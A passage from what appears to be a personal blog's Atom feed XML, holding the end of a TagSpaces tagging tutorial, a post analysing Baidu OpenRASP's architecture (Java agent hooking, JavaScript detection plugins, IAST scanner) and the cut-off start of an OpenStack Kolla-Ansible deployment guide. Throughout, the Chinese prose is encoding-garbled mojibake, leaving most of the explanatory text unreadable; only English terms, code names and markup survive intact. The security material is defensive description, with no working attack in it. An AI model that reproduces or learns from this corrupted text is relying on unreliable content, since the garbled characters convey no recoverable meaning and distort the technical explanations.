‡è®°åº“ï¼Œæœç´¢æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</li><li>å¯¼èˆªï¼šåˆ‡æ¢ä½ç½®æˆ–å¿«é€Ÿå¯¼èˆªåˆ°çˆ¶æ–‡ä»¶å¤¹</li><li>æµè§ˆåŒºåŸŸï¼šæµè§ˆæ–‡ä»¶å’Œæ–‡ä»¶å¤¹</li><li>å¸¸ç”¨æ“ä½œåŒºï¼šåœ¨è¿™é‡Œå¯ä»¥è®¿é—®å½“å‰æ‰“å¼€çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„å¸¸ç”¨æ“ä½œ</li><li>æ–‡ä»¶/æ–‡ä»¶å¤¹å±æ€§ï¼šå±•ç¤ºæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„ä¸€äº›å±æ€§</li><li>é¢„è§ˆåŒºï¼šé¢„è§ˆæˆ–ç¼–è¾‘å½“å‰æ–‡ä»¶</li></ol><img src="https://docs.tagspaces.org/assets/images/main-ui-areas-7170f35243bccbbfc608936cb13577ab.png" /><h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><p>é‡ç‚¹å°±æ˜¯ç»™æ–‡ä»¶å¤¹<strong>æ‰“æ ‡ç­¾</strong>ï¼Œé¦–å…ˆæˆ‘åˆ é™¤äº†é»˜è®¤å…³è”çš„æ–‡ä»¶å¤¹ï¼ˆLOCATION MANAGERï¼‰ï¼Œç„¶åå…³è”ä¿å­˜å§¿åŠ¿æ–‡ä»¶ï¼ˆCMToolï¼‰å’Œ Mod æ–‡ä»¶ï¼ˆTexToolsï¼‰çš„è·¯å¾„ã€‚</p><p>å…·ä½“çš„æ“ä½œæ˜¯ï¼š<code>CONNECT A LOCATION -&gt; å¡«å…¥ Location Path -&gt; è®¾ç½® Location Name -&gt; OK</code></p><p><img src="https://i.loli.net/2021/09/09/xIae7kfpDPzMN6J.jpg" style="zoom:70%;" /><br /></p><p>å…³è”ä¹‹åå°±å¯ä»¥è¿›è¡ŒæŸ¥çœ‹ï¼ˆæˆ‘è¿™é‡Œå·²ç»æ‰“äº†å‡ ä¸ªæ ‡ç­¾ï¼‰</p><p><img src="https://i.loli.net/2021/09/09/Rxa47IV2KDghcSr.jpg" style="zoom:70%;" /><br /></p><p>ç‚¹å‡»å·¦ä¾§çš„æ ‡ç­¾å¯ä»¥åˆ›å»ºæ ‡ç­¾ç»„ï¼Œæˆ‘å·²ç»æŠŠé»˜è®¤çš„æ ‡ç­¾ç»„éƒ½ç»™åˆ äº†ï¼ŒCollected Tags æ”¶é›†ç›´æ¥å¯¹æ–‡ä»¶/æ–‡ä»¶å¤¹æ·»åŠ ä¸åœ¨æ ‡ç­¾ç»„ä¸­çš„æ ‡ç­¾ã€‚</p><p><img src="https://i.loli.net/2021/09/09/HmOA7pC9KcfS3PT.jpg" style="zoom:70%;" /><br /></p><p>ç‚¹å‡» TAG LIBRARY æ—è¾¹çš„ä¸‰ä¸ªç‚¹ï¼Œé€‰æ‹©åˆ›å»ºæ ‡ç­¾ç»„ï¼ˆCreate Tag Groupï¼‰ï¼Œè®¾ç½®æ ‡ç­¾ç»„åç§°å’Œé»˜è®¤çš„èƒŒæ™¯/æ–‡å­—é¢œè‰²ï¼Œåˆ›å»ºå®Œæ¯•åæ‹¬å·å†…æ˜¾ç¤ºåˆ›å»ºæ ‡ç­¾æ—¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹åç§°ï¼Œä¸è¿‡å…¶ä»–æ–‡ä»¶å¤¹ä¹Ÿå¯ä»¥ç”¨å°±æ˜¯äº†ã€‚</p><p><img src="https://i.loli.net/2021/09/09/h2vuLrXIYQNVMjZ.png" style="zoom:60%;" /><br /></p><p>ç‚¹å‡»æ ‡ç­¾ç»„æ—è¾¹çš„ä¸‰ä¸ªç‚¹ï¼Œé€‰æ‹©æ·»åŠ æ ‡ç­¾ï¼ˆAdd Tagsï¼‰ï¼Œæ·»åŠ å®Œæ¯•åç‚¹å‡»æ ‡ç­¾æ—è¾¹çš„ä¸‰ä¸ªç‚¹å¯ä»¥è®¾ç½®æ ‡ç­¾åç§°ã€èƒŒæ™¯/æ–‡å­—é¢œè‰²ã€‚</p><p><img src="https://i.loli.net/2021/09/09/qr9kKMJY45F6RPp.png" style="zoom:60%;" /><br /></p><p>è®¾ç½®å®Œæ ‡ç­¾ä¹‹åå°±å¯ä»¥å¯¹æ–‡ä»¶å¤¹æ‰“æ ‡ç­¾äº†ï¼Œé€‰æ‹©æ–‡ä»¶å¤¹åï¼Œç‚¹å‡»ä¸Šæ–¹çš„æ ‡ç­¾å›¾æ ‡å³å¯æ·»åŠ æ ‡ç­¾ï¼Œä¸€æ¬¡å¯æ·»åŠ å¤šä¸ªæ ‡ç­¾ã€‚</p><img src="https://i.loli.net/2021/09/09/bvaD9USQEJsnmA7.jpg" style="zoom:75%;" /><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æˆ‘æŠŠä¸Šé¢çš„å†™å®Œæ‰çœ‹åˆ°è®¾ç½®é‡Œå¯ä»¥æ”¹æˆä¸­æ–‡ï¼Œç„¶ååœ¨å®‰è£…é‚£ä¸€èŠ‚è¡¥å……äº†è®¾ç½®æ–¹æ³• ğŸ†˜</p><p>æ€»ä½“æ¥è¯´ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œä¸ºäº†é¿å…é‡å‘½åæ–‡ä»¶ï¼Œæˆ‘é€‰æ‹©äº†ä½¿ç”¨é™„åŠ æ–‡ä»¶çš„æ–¹å¼ï¼Œè¿™æ ·åšçš„ç»“æœå°±æ˜¯æ–‡ä»¶å¤¹ä¸­ä¼šå‡ºç°ä¸€ä¸ª <code>.ts</code> æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­çš„ json æ–‡ä»¶ä¿å­˜äº†æ ‡ç­¾ä¿¡æ¯ã€‚<code>.ts</code> æ–‡ä»¶å¤¹é»˜è®¤æ˜¯éšè—çš„ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œå­˜çš„æ–‡ä»¶å¤¹å’Œæ ‡ç­¾ä¹Ÿå ä¸äº†å¤šå¤§ç©ºé—´ï¼Œæ‰€ä»¥è¿™æ ·å°±å¥½äº†ï¼</p><p><img src="https://i.loli.net/2021/09/09/qwxXlvUAaBdjfui.png" style="zoom:80%;" /><br /></p><p>è¿™ä¸ªå·¥å…·è¿˜æœ‰è®¸å¤šå…¶ä»–åŠŸèƒ½ï¼Œæˆ‘åªæ˜¯ç”¨äº†å…¶ä¸­çš„æ ‡ç­¾åŠŸèƒ½è€Œå·²ï¼Œæ›´å¤šçš„å°±çœ‹ <a href="https://docs.tagspaces.org/">æ–‡æ¡£</a> å‘æ˜å§~</p>]]></content>
    
    
    <summary type="html">ç»™æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“æ ‡ç­¾è¿›è¡Œç®¡ç†</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Windows" scheme="https://jckling.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>ç™¾åº¦ OpenRASP ç»„æˆåˆ†æ</title>
    <link href="https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</id>
    <published>2021-09-08T07:17:39.000Z</published>
    <updated>2021-10-11T13:39:04.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RASP-æ¶æ„"><a href="#RASP-æ¶æ„" class="headerlink" title="RASP æ¶æ„"></a>RASP æ¶æ„</h1><p>RASP å°† agent åµŒå…¥åº”ç”¨ï¼Œé€šè¿‡ hook æŠ€æœ¯æ¤å…¥æ¢é’ˆï¼Œåœ¨å…³é”®ç‚¹è§¦å‘æ£€æµ‹ï¼Œæ‹¦æˆª/æ”¾è¡Œ</p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/7195ace984937ccbddc171ece82e237e.png" style="zoom:80%;" /><p>Java åº”ç”¨çš„æ¢é’ˆæ¤å…¥æ–¹æ³•</p><ul><li>Servlet Filterï¼šåœ¨è¯·æ±‚å“åº”è·¯å¾„ä¸Šç›‘æµ‹ï¼Œåªèƒ½å¯¹ http æŠ¥æ–‡è¿‡æ»¤å¤„ç†</li><li>JVM é‡æ„ï¼šæ¤å…¥ JVM å†…éƒ¨, åŸºäº JVM çš„å®‰å…¨æ§åˆ¶å±‚å®ç° RASP å®¹å™¨<ul><li>éœ€è¦å¯¹ JVM éå¸¸ç†Ÿæ‚‰ï¼Œéš¾åº¦å¾ˆå¤§ï¼Œå›½å¤– <a href="https://www.waratek.com/runtime-application-self-protection-rasp/">waratek</a> é‡‡ç”¨è¿™ç§æ–¹æ³•</li></ul></li><li>Java Instrumentï¼šæ™®éï¼ŒOpenRASP ä½¿ç”¨è¯¥æ–¹æ³•</li></ul><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/fca02f0c30846c349a6f3f35998724dd.png" style="zoom:80%"><h1 id="OpenRASP-ç»„æˆéƒ¨åˆ†"><a href="#OpenRASP-ç»„æˆéƒ¨åˆ†" class="headerlink" title="OpenRASP ç»„æˆéƒ¨åˆ†"></a>OpenRASP ç»„æˆéƒ¨åˆ†</h1><ul><li>Java Agent</li><li>JavaScript æ’ä»¶</li><li>Agent ç®¡ç†åå°ï¼ˆVue + Golang å®ç°ï¼‰<ul><li>ElasticSearch + MongoDB</li></ul></li><li>IAST æ‰«æå™¨ï¼ˆPython å®ç°ï¼‰</li></ul><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>å¯åŠ¨æœåŠ¡æ—¶ä½¿ç”¨ <code>-javaagent</code> å‚æ•°æŒ‡å®š Java Agentï¼ŒåŠ¨æ€ä¿®æ”¹ Java å­—èŠ‚ç ï¼ˆå³ hook æ’æ¡©ï¼‰</p><ul><li>æ”»å‡»è§¦å‘æ’æ¡©ç‚¹ï¼ŒJava Agent è·å–åˆ°å‡½æ•°çš„å‚æ•°</li></ul><h3 id="å¯åŠ¨æµç¨‹"><a href="#å¯åŠ¨æµç¨‹" class="headerlink" title="å¯åŠ¨æµç¨‹"></a>å¯åŠ¨æµç¨‹</h3><ol><li>å¯åŠ¨æ—¶é¦–å…ˆä¼šè¿›å…¥ <code>javaagent</code> çš„ premain å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåœ¨ main å‡½æ•°ä¹‹å‰é¢„å…ˆæ‰§è¡Œ</li><li>å½“å» hook åƒ java.io.File è¿™æ ·ç”± <code>BootstrapClassLoader</code> åŠ è½½çš„ç±»çš„æ—¶å€™ï¼Œæ— æ³•ä»è¯¥ç±»è°ƒç”¨é <code>BootstrapClassLoader</code> åŠ è½½çš„ç±»ä¸­çš„æ¥å£ï¼Œæ‰€ä»¥ agent.jar ä¼šå…ˆå°†è‡ªå·±æ·»åŠ åˆ° <code>BootstrapClassLoader</code> çš„ ClassPath ä¸‹ï¼Œè¿™æ · hook ç”± <code>BootstrapClassLoader</code> åŠ è½½çš„ç±»çš„æ—¶å€™å°±èƒ½å¤ŸæˆåŠŸè°ƒç”¨åˆ° agent.jar ä¸­çš„æ£€æµ‹å…¥å£</li><li>é‡Šæ”¾ <code>log4j</code> æ—¥å¿—é…ç½®æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨åˆ™è·³è¿‡</li><li>æ ¹æ® <code>openrasp.yml</code> æ–‡ä»¶åˆå§‹åŒ–ç›¸åº”é…ç½®é¡¹</li><li>åˆå§‹åŒ– JS æ’ä»¶æ¨¡å—<ul><li>JS ä¸Šä¸‹æ–‡ç±»åˆå§‹åŒ–</li><li>æ’ä»¶æ–‡ä»¶åˆå§‹åŒ–</li></ul></li><li>åˆå§‹åŒ–å­—èŠ‚ç è½¬æ¢æ¨¡å—<ul><li>ç»™ load class æ“ä½œè¿›è¡Œæ’æ¡©æ“ä½œï¼Œå½“ç±»åŠ è½½çš„æ—¶å€™ä¼šå…ˆè¿›å…¥ agent è¿›è¡Œå¤„ç†</li><li>å¯¹äºåœ¨åˆå§‹åŒ–å‰å·²åŠ è½½çš„ç±»æ‰§è¡Œ <code>retransform</code> å¤„ç†ï¼Œe.g <code>FileInputStream</code></li></ul></li><li>è¾“å‡ºå¯åŠ¨æˆåŠŸæ—¥å¿—ï¼Œå¼€å¯å…¨å±€ Hook å¼€å…³ï¼ˆå¯åŠ¨é˜¶æ®µä¸ºå…³é—­çŠ¶æ€ï¼‰<ul><li>è‹¥å¯åŠ¨è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œè®°å½•é”™è¯¯æ—¥å¿—</li></ul></li><li>ç»™ openrasp.yml é…ç½®æ–‡ä»¶å’Œ js æ’ä»¶ç›®å½•ä»¥åŠ assets ç›®å½•å¢åŠ æ–‡ä»¶ç›‘æ§ï¼Œä»¥ä¾¿æ–‡ä»¶å†…å®¹æ›´æ”¹çš„æ—¶å€™ä¸éœ€è¦é‡å¯å°±èƒ½å¤Ÿå®æ—¶ç”Ÿæ•ˆ</li></ol><h3 id="hook-class-æµç¨‹"><a href="#hook-class-æµç¨‹" class="headerlink" title="hook class æµç¨‹"></a>hook class æµç¨‹</h3><ol><li>å› ä¸ºå¯åŠ¨æ—¶å€™è¿›è¡Œäº†æ’æ¡©æ“ä½œï¼ˆ<code>premain</code>ï¼‰ï¼Œå½“æœ‰ç±»è¢« ClassLoader åŠ è½½æ—¶å€™ï¼Œæ‰€ä»¥ä¼šæŠŠè¯¥ç±»çš„å­—èŠ‚ç å…ˆäº¤ç»™è‡ªå®šä¹‰çš„ Transformer å¤„ç†</li><li><strong>è‡ªå®šä¹‰ Transformer ä¼šåˆ¤æ–­è¯¥ç±»æ˜¯å¦ä¸ºéœ€è¦ hook çš„ç±»</strong>ï¼Œå¦‚æœæ˜¯ä¼šå°†è¯¥ç±»äº¤ç»™ javassist å­—èŠ‚ç å¤„ç†æ¡†æ¶è¿›è¡Œå¤„ç†</li><li>javassist æ¡†æ¶ä¼šå°†ç±»çš„å­—èŠ‚ç ä¾ç…§äº‹ä»¶é©±åŠ¨æ¨¡å‹é€æ­¥è§£ææ¯ä¸ªæ–¹æ³•ï¼Œå½“è§¦å‘éœ€è¦ hook çš„æ–¹æ³•æ—¶ï¼Œä¼šåœ¨æ–¹æ³•çš„å¼€å¤´æˆ–è€…ç»“å°¾æ’å…¥è¿›å…¥æ£€æµ‹å‡½æ•°çš„å­—èŠ‚ç </li><li>æŠŠ hook å¥½çš„å­—èŠ‚ç è¿”å›ç»™ transformer ä»è€Œè½½å…¥è™šæ‹Ÿæœº</li></ol><img src="https://rasp.baidu.com/doc/hacking/architect/images/startup.png" style="zoom:80%"><h3 id="è¯·æ±‚å¤„ç†æµç¨‹"><a href="#è¯·æ±‚å¤„ç†æµç¨‹" class="headerlink" title="è¯·æ±‚å¤„ç†æµç¨‹"></a>è¯·æ±‚å¤„ç†æµç¨‹</h3><p>ä»¥ <code>tomcat + JDBC + MySQL</code> ä¸ºä¾‹</p><ol><li>æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œä»è€Œè¿›å…¥äº†æœåŠ¡å™¨çš„è¯·æ±‚ hook ç‚¹ï¼Œè¯¥ hook ç‚¹æ ‡æ³¨å½“å‰çº¿ç¨‹ä¸ºè¯·æ±‚çº¿ç¨‹ï¼Œå¼€å¯å½“å‰çº¿ç¨‹çš„æ£€æµ‹å¼€å…³å¹¶æŠŠè¯·æ±‚å¯¹è±¡å’Œå“åº”å¯¹è±¡è¿›è¡Œç¼“å­˜ï¼Œä»¥ä¾¿åé¢ä½¿ç”¨</li><li>æœåŠ¡å™¨å‘èµ· SQL æŸ¥è¯¢</li><li>è¿›å…¥ SQLStatementHook ç‚¹ï¼Œæˆ‘ä»¬æŒ‚é’©äº† executeã€executeUpdateã€executeQuery ç­‰æ–¹æ³•ï¼Œä»è¯¥æ–¹æ³•è¿›å…¥æ£€æµ‹æµç¨‹å¦‚ä¸‹ï¼š<ul><li>åˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦ä¸ºè¯·æ±‚çº¿ç¨‹ï¼ˆç¬¬ä¸€æ­¥æ ‡è®°çš„ï¼‰ï¼Œå¦‚æœæ˜¯ç»§ç»­ä¸‹é¢æ£€æµ‹</li><li>é‡‡é›† <code>connection_idï¼ˆè¿™ä¸ªå­—æ®µä»…JDBCæ”¯æŒï¼‰</code>ã€<code>SQL è¯­å¥</code> ä»¥åŠ <code>æ•°æ®åº“ç±»å‹</code> ç­‰ä¿¡æ¯</li><li>æ„å»ºå‚æ•°ä¿¡æ¯ï¼Œè°ƒç”¨<strong>æœ¬åœ°æ’ä»¶ï¼ˆJavaï¼‰å’Œ JS æ’ä»¶</strong>è¿›è¡Œå®‰å…¨æ£€æµ‹<ul><li>è¿˜æœ‰<strong>åŸºçº¿æ£€æµ‹</strong></li></ul></li><li>æ ¹æ®æ’ä»¶çš„æ‰§è¡Œç»“æœå†³å®šæ˜¯æ‹¦æˆªè¯·æ±‚ã€æ”¾è¡Œè¿˜æ˜¯ä»…æ‰“å°æ—¥å¿—</li></ul></li><li>è¿›å…¥ SQLResultSetHook ç‚¹ï¼Œæˆ‘ä»¬æŒ‚é’©äº† resultSet.next æ–¹æ³•<ul><li>è°ƒç”¨æœ¬åœ°æ’ä»¶æ£€æŸ¥æ˜¯å¦å‘ç”Ÿæ‹–åº“è¡Œä¸ºï¼Œé»˜è®¤ç­–ç•¥ä¸ºä¸€æ¬¡æŸ¥è¯¢ç»“æœè¶…è¿‡ 500 æ¡å°±æŠ¥è­¦</li></ul></li><li>è‹¥å†³å®šæ‹¦æˆªæ”»å‡»<ul><li>è¾“å‡ºæŠ¥è­¦æ—¥å¿—åˆ° logs/alarm.log</li><li>å¦‚æœ header è¿˜æ²¡æœ‰å‘å‡ºï¼Œé»˜è®¤ä½¿ç”¨ 302 è·³è½¬åˆ°æ‹¦æˆªé¡µé¢</li><li>å¦‚æœ body è¿˜æ²¡æœ‰å‘å‡ºï¼Œåˆ™é‡ç½®æœªå‘é€çš„ body</li><li>è¾“å‡ºè‡ªå®šä¹‰æ‹¦æˆªé¡µé¢è·³è½¬ js è„šæœ¬<ul><li><code>&lt;/script&gt;&lt;script&gt;location.href=&#39;.../?request_id=xxx&#39;&lt;/script&gt;</code></li></ul></li></ul></li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li><code>-javaagent</code> å¯åŠ¨æœåŠ¡æ—¶åŠ è½½ Agentï¼Œåœ¨ <code>premain</code> å‡½æ•°ä¸­å®šä¹‰æ’æ¡©é€»è¾‘ï¼Œå®ç°æ’æ¡©<ul><li>é¢„å®šä¹‰çš„ hook ç‚¹ï¼š<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook å‡½æ•°åˆ—è¡¨</a></li><li>å¯æ–°å¢ hook ç‚¹</li></ul></li><li>æ”¶åˆ°è¯·æ±‚åï¼Œè§¦å‘æ’æ¡©ç‚¹æ”¶é›†å‡½æ•°è°ƒç”¨å‚æ•°ä¿¡æ¯ï¼Œè°ƒç”¨æ’ä»¶æ£€æµ‹</li><li>æ’ä»¶æ£€æµ‹å¹¶è¿”å›ç»“æœï¼Œæ ¹æ®ç­–ç•¥æ‰§è¡Œç›¸åº”æ“ä½œ</li></ul><h2 id="JavaScript-æ’ä»¶"><a href="#JavaScript-æ’ä»¶" class="headerlink" title="JavaScript æ’ä»¶"></a>JavaScript æ’ä»¶</h2><p>Rhino å¼•æ“æ”¯æŒå°† Java ä¸­çš„å¯¹è±¡æ³¨å†Œåˆ° JavaScript ç¯å¢ƒï¼Œå¹¶è¢« JavaScript ä»£ç è°ƒç”¨ï¼ˆæ•°æ®å…±äº«ï¼‰</p><ul><li><a href="https://github.com/mozilla/rhino">mozilla/rhino</a></li><li>JS æ’ä»¶æä¾›çƒ­æ›´æ–°åŠŸèƒ½ï¼Œå³<strong>èƒ½å¤Ÿå®æ—¶æ›´æ–°æ£€æµ‹é€»è¾‘</strong></li><li>æ ¹æ® Java Agent è¿”å›çš„æ’æ¡©ç‚¹ä¿¡æ¯ï¼Œæ‰§è¡Œæ£€æµ‹ç®—æ³•ï¼Œæœ€åè¿›è¡Œ<strong>å‘Šè­¦/æ‹¦æˆª</strong></li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/js.png" style="zoom:80%"><p>æ£€æµ‹æ’ä»¶é’ˆå¯¹åº”ç”¨çš„è¡Œä¸ºè¿›è¡Œæ£€æµ‹ï¼Œå½“åº”ç”¨æ‰§è¡Œæ“ä½œæ—¶ï¼ˆè§¦å‘æ£€æµ‹ç‚¹ï¼‰ï¼ŒOpenRASP å¼•æ“å°±ä¼šè°ƒç”¨æ£€æµ‹æ’ä»¶ï¼Œå¹¶å°†ç›¸å…³å‚æ•°ä¸€å¹¶ä¼ é€’è¿‡æ¥ã€‚</p><p>å®˜æ–¹æä¾› 14 ä¸ªæ£€æµ‹ç‚¹ï¼š</p><ul><li>æ•°æ®åº“æŸ¥è¯¢</li><li>è¯»å–ç›®å½•</li><li>è¯·æ±‚å‚æ•°</li><li>è¯»å–æ–‡ä»¶</li><li>å†™å…¥æ–‡ä»¶</li><li>åˆ é™¤æ–‡ä»¶</li><li>æ–‡ä»¶åŒ…å«æ“ä½œ</li><li>WebDAV æ“ä½œ</li><li>æ–‡ä»¶ä¸Šä¼ </li><li>æ–‡ä»¶é‡å‘½å</li><li>å‘½ä»¤æ‰§è¡Œ</li><li>XML å¤–éƒ¨å®ä½“å¼•ç”¨</li><li>Struts OGNL è¡¨è¾¾å¼è§£æ</li><li>RMI ååºåˆ—åŒ–</li><li>æœåŠ¡å™¨ç«¯ HTTP è¯·æ±‚</li><li>æœåŠ¡å™¨ç«¯ HTTP è¯·æ±‚ - é‡å®šå‘ä¹‹å</li><li>ä»£ç æ‰§è¡Œ</li><li>ç±»åº“åŠ è½½</li><li>å“åº”æ£€æŸ¥</li></ul><h2 id="IAST-æ‰«æå™¨"><a href="#IAST-æ‰«æå™¨" class="headerlink" title="IAST æ‰«æå™¨"></a>IAST æ‰«æå™¨</h2><p>è¢«åŠ¨æ‰«ææ¨¡å¼ï¼šå¯åŠ¨æ‰«æåä¿æŒè¿è¡Œï¼Œå¯¹æ–° url è¿›è¡Œå®æ—¶æ‰«æ</p><ul><li>Python3 å®ç°ï¼ŒMySQL æ•°æ®åº“ï¼ŒHTTP + JSON é€šè®¯</li><li>å±äºä¸»åŠ¨ IASTï¼Œé‡æ”¾ payload<ul><li>è¢«åŠ¨ IAST ä½¿ç”¨æ±¡ç‚¹è¿½è¸ªå®ç°</li><li>ç¼ºç‚¹ï¼šè„æ•°æ®</li></ul></li></ul><p><strong>Agent ç«¯</strong></p><p>ç”¨äºæ”¶é›† Web åº”ç”¨çš„è¿è¡Œä¿¡æ¯ï¼Œå³ OpenRASP Java Agent + Java Application</p><p><strong>æ‰«æå™¨ç«¯</strong></p><p>ç”¨äºå¤„ç† OpenRASP æ’ä»¶äº§ç”Ÿçš„è¯·æ±‚ä¿¡æ¯ï¼Œå¹¶å®Œæˆæ•´ä¸ª IAST æ‰«æé€»è¾‘</p><ul><li>é¢„å¤„ç†æ¨¡å—ï¼ˆHTTPServerï¼‰ï¼šæ¥æ”¶ agent æ’ä»¶çš„ http è¯·æ±‚ï¼Œå¤„ç†ã€å­˜å‚¨ã€åˆ†å‘ http è¯·æ±‚ä¿¡æ¯</li><li>æ‰«ææ¨¡å—ï¼ˆScannerï¼‰ï¼šè¿è¡Œæ‰«ææ’ä»¶ï¼Œæ‰§è¡Œæ¼æ´æ‰«æé€»è¾‘<ul><li>ç”Ÿæˆæ‰«æè¯·æ±‚ï¼Œå‘é€ç»™ web server å¤„ç†å¹¶è¿”å›ç»“æœï¼ˆä»¥åŠ hook ä¿¡æ¯ï¼‰ï¼Œæ£€éªŒç»“æœ</li></ul></li><li>ç›‘æ§æ¨¡å—ï¼ˆMonitorï¼‰ï¼šå®šæœŸè·å–å…¶ä»–æ¨¡å—çš„è¿è¡Œæ—¶ä¿¡æ¯ï¼Œè°ƒæ•´å‚æ•°ï¼Œæä¾›æ§åˆ¶å°æœåŠ¡ç­‰</li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/iast-main.png" style="zoom:80%"><p><a href="https://github.com/baidu-security/openrasp-iast">openrasp_iast</a> æºç ä¸­åŒ…å«ä¸‰ç§ç±»å‹çš„æ’ä»¶</p><ul><li>æ‰«ææ’ä»¶ï¼šplugin/scannerï¼Œç”Ÿæˆæµ‹è¯•å‘é‡ï¼Œæ£€æµ‹æµ‹è¯•ç»“æœ</li><li>å»é‡æ’ä»¶ï¼šplugin/deduplicateï¼Œé¿å…åŒä¸€ä¸ªè¯·æ±‚è¢«åå¤æ‰«æ</li><li>è®¤è¯æ’ä»¶ï¼šplugin/authorizer</li></ul><p>æ‰§è¡Œæµç¨‹</p><ol><li>ç­‰å¾…ç”¨æˆ·å‘é€è¯·æ±‚</li><li>Agent ç«¯å°† hook ä¿¡æ¯å‘é€ç»™æ‰«æå™¨ç«¯</li><li>æ‰«æå™¨ç«¯æ„å»º payload é‡æ”¾</li><li>Agent ç«¯å°† hook ä¿¡æ¯å‘é€ç»™æ‰«æå™¨ç«¯ï¼Œæ‰«æå™¨ç«¯æ”¶åˆ°å“åº”</li></ol><p>RASP + IAST</p><ul><li>RASP å®‰è£… IAST æ’ä»¶ï¼šopenrasp/plugins/iast/plugin.jsï¼ˆçƒ­æ›´æ–°ï¼‰<ul><li>æ³¨å†Œ hook ç‚¹ï¼Œè§¦å‘æ£€æµ‹é€»è¾‘</li></ul></li><li>IAST æ‰«æå™¨ç»“åˆæ’ä»¶ä½¿ç”¨<ul><li>hook ä¿¡æ¯ã€å“åº”ä¿¡æ¯</li></ul></li></ul><h2 id="ç®¡ç†åå°"><a href="#ç®¡ç†åå°" class="headerlink" title="ç®¡ç†åå°"></a>ç®¡ç†åå°</h2><p>ç®¡ç† Agentã€æŸ¥è¯¢æ—¥å¿—</p><img src="https://rasp.baidu.com/doc/hacking/architect/images/rasp-cloud.png" style="zoom:80%"><h1 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ol><li>hook ç‚¹é¢„å…ˆå®šä¹‰ï¼Œè§¦å‘åè°ƒç”¨ JS æ’ä»¶æ£€æµ‹</li><li>æ‰«æå™¨æ¥æ”¶è¯·æ±‚åŠå…¶ hook ä¿¡æ¯ï¼Œæ„é€ æ–°çš„è¯·æ±‚ï¼Œæ ¹æ®æ‰§è¡Œç»“æœå’Œ hook ä¿¡æ¯å®ç°æ£€æµ‹</li></ol><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="http://blog.nsfocus.net/rasp-tech/">RASPæŠ€æœ¯åˆ†æ</a></li><li><a href="https://rasp.baidu.com/doc/">OpenRASP å®˜æ–¹æ–‡æ¡£</a></li></ul>]]></content>
    
    
    <summary type="html">æ¢³ç† OpenRASP çš„å„ä¸ªç»„æˆéƒ¨åˆ†ï¼šJava Agent æ’æ¡©ã€JS æ’ä»¶æ£€æµ‹ã€ç®¡ç†åå°ã€IAST æ‰«æå™¨ã€‚</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Golang" scheme="https://jckling.github.io/tags/Golang/"/>
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Kolla-Ansible å¤šæœºéƒ¨ç½² V ç‰ˆ OpenStack</title>
    <link href="https://jckling.github.io/2021/08/31/OpenStack/Kolla-Ansible%20%E5%A4%9A%E6%9C%BA%E9%83%A8%E7%BD%B2/"/>
    <id>https://jckling.github.io/2021/08/31/OpenStack/Kolla-Ansible%20%E5%A4%9A%E6%9C%BA%E9%83%A8%E7%BD%B2/</id>
    <published>2021-08-31T01:49:26.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æµ‹è¯•ç¯å¢ƒæ­å»º"><a href="#æµ‹è¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æµ‹è¯•ç¯å¢ƒæ­å»º"></a>æµ‹è¯•ç¯å¢ƒæ­å»º</h1><p>ä¹‹å‰æŠŠæœ¬åœ°é•œåƒä»“åº“ã€OpenStackã€Jaeger å…¨éƒ½æ”¾åœ¨äº†ä¸€å°ä¸»æœºä¸Šè·‘ï¼Œè´Ÿè½½å¾ˆå¤§ï¼Œè€Œä¸”ä¹Ÿä¸ä¿é™©ã€‚ç°åœ¨æ‹†åˆ†ä¸º 2 å°ä¸»æœºï¼š</p><ol><li>éƒ¨ç½²èŠ‚ç‚¹ï¼ˆKolla-Ansibleï¼‰<ul><li>Ubuntu 20.04</li><li>4 CPU </li><li>å†…å­˜ 16 GB</li><li>ç¡¬ç›˜ 500 GB</li><li>ç½‘å¡1</li></ul></li><li>æ§åˆ¶èŠ‚ç‚¹ï¼ˆOpenStackï¼‰<ul><li>Ubuntu 20.04</li><li>4 CPU </li><li>å†…å­˜ 16 